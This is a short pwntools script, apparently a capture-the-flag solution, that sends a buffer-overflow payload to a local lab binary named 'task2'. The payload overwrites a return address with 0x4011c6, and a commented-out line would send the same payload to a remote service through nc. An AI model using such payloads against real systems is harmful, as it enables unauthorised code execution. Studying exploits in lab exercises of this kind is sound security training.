from pwn import *

io = process("./task2")
#io = process(["/bin/nc", "ip", "port"])

io.recvline()
io.recvline()
io.recvline()
io.recvline()
io.recvline()
io.recvline()
io.recvline()
io.recvline()
io.recvline()

io.sendline(b'\x41'*8 + b'\x00'*32 + b'\xc6\x11\x40\x00' + b'\x00'*4)

hello = io.recvline()
print(hello)
hello = io.recvline()
print(hello)
hello = io.recvline()
print(hello)

